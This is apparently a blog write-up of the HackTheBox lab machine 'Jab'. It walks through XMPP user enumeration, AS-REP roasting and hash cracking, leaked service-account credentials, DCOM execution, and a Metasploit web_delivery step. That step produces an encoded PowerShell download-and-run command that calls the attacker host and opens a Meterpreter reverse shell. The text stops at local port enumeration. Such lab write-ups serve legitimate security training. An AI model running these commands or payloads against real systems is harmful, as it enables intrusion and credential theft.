+++
date = '2025-02-05T16:43:23-05:00'
draft = false
title = 'HtB Jab'
tags = ['writeup','hackthebox','medium','windows','active directory']
hideToc = false
+++
![Jab](/images/Jab.png)
Jab is a medium-difficulty Windows machine that features an Openfire XMPP server, hosted on a Domain Controller (DC). Public registration on the XMPP server allows the user to register an account. Then, by retrieving a list of all the users on the domain, a kerberoastable account is found, which allows the attacker to crack the retrieved hash for the user's password. By visiting the account's XMPP chat rooms, another account's password is retrieved. This new account has DCOM privileges over the DC, thus granting the attacker local access on the machine. Finally, a malicious plugin uploaded through the locally-hosted Openfire Administration Panel gives the user SYSTEM access.

---

## Scanning

### nmap

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ nmap -T4 -p- -A -v 10.129.230.215
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-05 18:14:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
|_ssl-date: 2025-02-05T18:15:55+00:00; +1m41s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T18:15:55+00:00; +1m41s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
|_ssl-date: 2025-02-05T18:15:55+00:00; +1m41s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.jab.htb
| Issuer: commonName=jab-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-11-01T20:16:18
| Not valid after:  2024-10-31T20:16:18
| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
|_ssl-date: 2025-02-05T18:15:54+00:00; +1m41s from scanner time.
5222/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     unknown: 
|_    stream_id: 1uxtkf3244
5223/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|     compression_methods: 
|     unknown: 
|_    capabilities: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_ssl-date: TLS randomness does not represent time
5262/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     unknown: 
|_    stream_id: 3yzkarmvqu
5263/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|     compression_methods: 
|     unknown: 
|_    capabilities: 
5269/tcp  open  xmpp          Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|     compression_methods: 
|     unknown: 
|_    capabilities: 
5270/tcp  open  ssl/xmpp      Wildfire XMPP Client
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
5275/tcp  open  jabber        Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|       version: 1.0
|     capabilities: 
|     compression_methods: 
|     unknown: 
|_    stream_id: 7wn7oej6l
5276/tcp  open  ssl/jabber    Ignite Realtime Openfire Jabber server 3.10.0 or later
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_ssl-date: TLS randomness does not represent time
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     features: 
|     errors: 
|       (timeout)
|     auth_mechanisms: 
|     xmpp: 
|     compression_methods: 
|     unknown: 
|_    capabilities: 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7070/tcp  open  http          Jetty
|_http-title: Openfire HTTP Binding Service
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7443/tcp  open  ssl/http      Jetty
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Issuer: commonName=dc01.jab.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T22:00:12
| Not valid after:  2028-10-24T22:00:12
| MD5:   3317:65e1:e84a:14c2:9ac4:54ba:b516:26d8
|_SHA-1: efd0:8bde:42df:ff04:1a79:7d20:bf87:a740:66b8:d966
|_http-title: Openfire HTTP Binding Service
7777/tcp  open  socks5        (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  msrpc         Microsoft Windows RPC
49824/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/5%OT=53%CT=1%CU=41402%PV=Y%DS=2%DC=T%G=Y%TM=67A3AA78
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=
OS:S%TS=U)SEQ(SP=101%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=
OS:1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II
OS:=I%SS=S%TS=U)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M5
OS:3CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS
OS:)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W
OS:=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR
OS:%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
OS:=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m40s, deviation: 0s, median: 1m40s
| smb2-time: 
|   date: 2025-02-05T18:15:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

### XMPP - 5269, 5270 (tcp)

>If you don't already have an XMPP/Jabber client, I'd recommend `Pidgin`.
>`apt install pidgin`

Let's see if we're allowed to create an account.

![jab1](/images/jab1.png)
![jab2](/images/jab2.png)
![jab3](/images/jab3.png)

Indeed we are, great news! Now let's see what else we can find on the XMPP server by doing a service discovery. You can enable the plugin for Pidgin in the Tools menu.

![jab4](/images/jab4.png)

We're also able to search for users using the feature under the Accounts tab.

![jab5](/images/jab5.png)

If we open the Debug window, we can see the raw XML for this query and copy the names, usernames, and emails for hopeful later use. I used CyberChef's "Extract email addresses" recipe to help parse the massive XML data from the log. I saved two files:
* `emails.txt` - Contained email addresses
* `usernames.txt` - Stripped the "@jab.htb"

![jab6](/images/jab6.png)

### Openfire - 7070, 7443 (tcp)

Maybe this will come in handy later?

```xml
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ cat /usr/share/exploitdb/exploits/multiple/remote/32967.txt 
source: https://www.securityfocus.com/bid/34804/info

Openfire is prone to a vulnerability that can permit an attacker to change the password of arbitrary users.

Exploiting this issue can allow the attacker to gain unauthorized access to the affected application and to completely compromise victims' accounts.

Versions prior to Openfire 3.6.4 are vulnerable.

<iq type='set' id='passwd_change'>
<query xmlns='jabber:iq:auth'>
<username>test2</username>
<password>newillegalychangedpassword</password>
</query>
</iq> 
```

## Initial Access

### Kerberoasting

With our giant list of usernames, we should be able to see if any accounts have the `UF_DONT_REQUIRE_PREAUTH` value set, and perform a kerberoast attack.  Let's find out.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ impacket-GetNPUsers -no-pass -usersfile usernames.txt jab.htb/ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
<---snip--->
[-] User jmiller doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jmontes doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jmontgomery@JAB.HTB:0a06d2b4cc9e47a648a2d9d8140e04ba$131f41d363e08e682c841f6fc8ef6de56329b4cae121fa400ab817ffd63a87341fb5471c26891d8574640c0db206e92f6b590951a0a561c5a31a63247294ba568a1fc9ab52962a7c7a150623639eb0a413a293906ca0ced0e4a84e306e26102660e03eef6ad85f7c8e04d385ad6be5b33ca386b22e317517e68b7067caa0b095c0cfa4ce35904420ba65bba481da6ab1594fd1feceb39ae811f8d15af63db82e4a4145f4b90a0503de3c39542ad901c7710b5ba38fdac833a6de0d2a9b89050d782b6510923a8b6f3f2f7d671a18700383b5fe9a42467b89e6819ddd26cedfd01780
[-] User jmoore doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jmoreno doesn't have UF_DONT_REQUIRE_PREAUTH set
<---snip--->
[-] User lbell doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$lbradford@JAB.HTB:db1c3b7604945f4264780698530ea00a$dcbbacefc69dbe2d54526509e524df8e38cce73432344590c470c7643c44f498090395a087c238d2d5a4362ca0a4edefccaff8881f244abf9b14c797ebf5ee746a1b855948f3c47cbff320caee3a8acc9f1f7541af27d54e3f99deef1d00ebaf96e27cd0411b096171f431205c790cc45bd3b38b693619558502b32aed78dd7667b871341519a7e0beb229634925c07655c3176eb06b4d3789a282d48ec7b8ddace92a4060e615589aa502106be30dbd31e91739dabf21a7ea5a9084d9eb5fe9f468db55f729b63889c044b7c2203846f4c4e8ff6204f2ea6557436e43237d28d356
[-] User lbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
<---snip--->
[-] User mlondon doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mlowe@JAB.HTB:c485728b0cd9d4144bdd0d19b3060ecc$ae3dc6afcf338e061ad0de02de0eecf7f928c43f625bfe9422e5255b5a54491fb86430f79052304de8f2b7335c0dee0ea63b04bbadc2c6de98e59f300e7b526a8adcaa49e23cc92338ccfe1bba84780ac860a8195cc88282557369278b156e1c8cc7c393cd8c80c7936cf1de8a03c525983849982d70e3d105530b74732ed593349c943d3eb53d1aad206d6a5eb36a903c27d608d03397ebcca4e1ce56ebea5168d7a9dc3f96f4a4e6db6ac04166f7535a2208401f037529217bc69e3acc08265a3af3a244e71677134ca8bb37cae5273aed677209e0eb1277fd807e99cac0a5a6f4
[-] User mlucas doesn't have UF_DONT_REQUIRE_PREAUTH set
<---snip--->
```

That was worthwhile... we were able to grab 3 kerberos hashes to try and crack.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt.gz -m 18200
hashcat (v6.2.6) starting

$krb5asrep$23$jmontgomery@JAB.HTB:0a06d2b4cc9e47a648a2d9d8140e04ba$131f41d363e08e682c841f6fc8ef6de56329b4cae121fa400ab817ffd63a87341fb5471c26891d8574640c0db206e92f6b590951a0a561c5a31a63247294ba568a1fc9ab52962a7c7a150623639eb0a413a293906ca0ced0e4a84e306e26102660e03eef6ad85f7c8e04d385ad6be5b33ca386b22e317517e68b7067caa0b095c0cfa4ce35904420ba65bba481da6ab1594fd1feceb39ae811f8d15af63db82e4a4145f4b90a0503de3c39542ad901c7710b5ba38fdac833a6de0d2a9b89050d782b6510923a8b6f3f2f7d671a18700383b5fe9a42467b89e6819ddd26cedfd01780:Midnight_121

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: hashes.txt
Time.Started.....: Wed Feb  5 14:42:40 2025 (8 secs)
Time.Estimated...: Wed Feb  5 14:42:48 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3564.6 kH/s (0.97ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/3 (33.33%) Digests (total), 0/3 (0.00%) Digests (new), 1/3 (33.33%) Salts
Progress.........: 43033155/43033155 (100.00%)
Rejected.........: 0/43033155 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 89%
```

And now we've got a set of credentials for the machine: `jmontgomery:Midnight_121`

### Back to XMPP

We've logged back into XMPP via Pidgin, this time as user `jmontgomery`. When we view the Room List, we see a room we didn't see before: `pentest2003`

![jab7](/images/jab7.png)
![jab8](/images/jab8.png)

Looks like there was a discussion of findings from a previous penetration test, where a service account `svc_openfire` was kerberoasted, and password ultimately cracked: `!@#$%^&*(1qazxsw`

A quick check using `netexec` shows these credentials are still valid, and have not been fixed.

### Bloodhound Enumeration

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ bloodhound-python -d jab.htb -u svc_openfire@jab.htb -p '!@#$%^&*(1qazxsw'  -ns 10.129.230.215 --dns-tcp -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: jab.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.jab.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 502 computers
INFO: Connecting to LDAP server: dc01.jab.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 2687 users
INFO: Found 162 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Done in 02M 14S
```

![jab9](/images/jab9.png)

Looks like `svc_openfire` has ExecuteDCOM permissions over `dc01.jab.htb`

### DCOM

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@jab.htb   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] DCOM SessionError: code: 0x8000401a - CO_E_RUNAS_LOGON_FAILURE - The server process could not be started because the configured identity is incorrect. Check the user name and password.
```

Interesting. We know the credentials are valid from testing them out using `netexec` earlier... let's play with some of the parameters in `dcomexec` and see if we can get it working. Turns out we have to use `-object MMC20` and `-silentcommand` to gain execution.

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.230.215 'ping 10.10.14.172' -silentcommand -object MMC20
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

// second terminal window
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ sudo tcpdump -ni tun0 icmp
[sudo] password for pl4stic: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:31:55.976027 IP 10.129.230.215 > 10.10.14.172: ICMP echo request, id 1, seq 247, length 40
15:31:55.976087 IP 10.10.14.172 > 10.129.230.215: ICMP echo reply, id 1, seq 247, length 40
15:31:57.000052 IP 10.129.230.215 > 10.10.14.172: ICMP echo request, id 1, seq 248, length 40
15:31:57.000091 IP 10.10.14.172 > 10.129.230.215: ICMP echo reply, id 1, seq 248, length 40
15:31:57.951535 IP 10.129.230.215 > 10.10.14.172: ICMP echo request, id 1, seq 249, length 40
15:31:57.951557 IP 10.10.14.172 > 10.129.230.215: ICMP echo reply, id 1, seq 249, length 40
15:31:59.048229 IP 10.129.230.215 > 10.10.14.172: ICMP echo request, id 1, seq 250, length 40
15:31:59.048276 IP 10.10.14.172 > 10.129.230.215: ICMP echo reply, id 1, seq 250, length 40
```

```sh
msfconsole
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > set target 2      // PowerShell
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost tun0
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.172:4444 
[*] Using URL: http://10.10.14.172:8080/AMwSYcTcwqz
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABnADgAbwBrAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGcAOABvAGsALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABnADgAbwBrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6AC8AeAA4ADMARgBmAHkATwA1AEoAUwBZAGQAdwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6ACcAKQApADsA
```

```sh
┌──(pl4stic㉿shattersec)-[~/htb/jab]
└─$ impacket-dcomexec jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.230.215 'powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABnADgAbwBrAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGcAOABvAGsALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABnADgAbwBrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6AC8AeAA4ADMARgBmAHkATwA1AEoAUwBZAGQAdwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6ACcAKQApADsA' -silentcommand -object MMC20
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
```

```sh
[*] 10.129.230.215   web_delivery - Delivering AMSI Bypass (1375 bytes)
[*] 10.129.230.215   web_delivery - Delivering Payload (3701 bytes)
[*] Sending stage (203846 bytes) to 10.129.230.215
[*] Meterpreter session 1 opened (10.10.14.172:4444 -> 10.129.230.215:55707) at 2025-02-05 15:39:15 -0500

meterpreter > getuid
Server username: JAB\svc_openfire
meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
```

## Privilege Escalation

### OpenFire Admin Console

Doing some enumeration, we can see there's an additional OpenFire endpoint open locally on `9090` and `9091`.

```sh
meterpreter > netstat -ino

Connection list
===============

    Proto  Local address         Remote address        State        User  Inode  PID/Program name
    -----  -------------         --------------        -----        ----  -----  ----------------
<---snip--->
    tcp    127.0.0.1:9090        0.0.0.0:*             LISTEN       0     0      3284/openfire-service.exe
